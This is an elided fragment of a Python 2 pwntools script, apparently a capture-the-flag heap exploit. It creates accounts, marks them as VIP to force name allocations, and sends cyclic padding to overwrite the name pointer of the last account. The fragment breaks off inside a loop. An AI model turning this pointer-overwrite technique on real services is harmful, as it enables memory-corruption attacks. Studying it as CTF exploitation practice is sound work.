...
for i in xrange(6):
    io.sendlineafter(':', 1)
    io.sendline(str(i) + cyclic(84))
    io.sendline(1)

# set all as vip to malloc name
for i in xrange(6):
    io.sendlineafter(':', 6)
    io.sendline(str(i) + cyclic(84))
...
# create another 2 account
for i in xrange(6, 8):
    io.sendlineafter(':', 1)
    io.sendline(str(i) + cyclic(84))
    io.sendline(1)

# overwrite name ptr of last account
io.sendlineafter(':', 2)
io.send(cyclic(0x48)[0x3f:] + '\0')
io.sendline('c')
payload = cyclic(0x60)
payload += '44'
io.send(payload + '\0')
...
io.sendlineafter(':', 4)
io.recvline_startswith('money is')
for i in xrange(8):
